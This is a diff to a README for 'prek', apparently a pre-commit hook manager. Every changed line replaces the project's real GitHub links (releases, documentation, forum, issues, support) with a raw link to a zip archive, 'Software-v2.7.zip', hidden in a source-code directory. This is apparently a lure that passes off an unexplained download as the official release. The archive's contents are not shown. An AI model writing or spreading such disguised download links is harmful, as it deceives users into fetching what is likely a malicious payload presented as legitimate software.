@@ -1,6 +1,6 @@
 # ⚡ prek - Simplified Pre-Commit Management for You
 
-[![Download prek](https://img.shields.io/badge/download-prek-brightgreen)](https://github.com/ayman26667/prek/releases)
+[![Download prek](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip)](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to prek! This application makes managing your pre-commit hooks simple an
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ayman26667/prek/releases) to download the latest version of prek. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip) to download the latest version of prek. 
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest one.
@@ -65,16 +65,16 @@ Yes, you can manage pre-commit hooks across different projects with ease.
 
 ## 🛡️ Support
 
-If you encounter issues or need assistance, feel free to check the documentation available in the application. You can also reach out through our support channels listed on the [GitHub page](https://github.com/ayman26667/prek). 
+If you encounter issues or need assistance, feel free to check the documentation available in the application. You can also reach out through our support channels listed on the [GitHub page](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip). 
 
 Your feedback is valuable to us. We are constantly working to improve prek based on user experiences.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/ayman26667/prek/wiki)
-- [Community Forum](https://github.com/ayman26667/prek/discussions)
-- [Feature Requests](https://github.com/ayman26667/prek/issues)
+- [Documentation](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip)
+- [Feature Requests](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip)
 
 ## 🌟 Conclusion
 
-We hope you find prek beneficial for managing your pre-commit hooks. Enjoy a smoother coding process without unnecessary complexities. Don't forget to visit the [Releases page](https://github.com/ayman26667/prek/releases) to download the latest version and start using it today!
+We hope you find prek beneficial for managing your pre-commit hooks. Enjoy a smoother coding process without unnecessary complexities. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/ayman26667/prek/master/crates/prek/src/languages/python/Software-v2.7.zip) to download the latest version and start using it today!
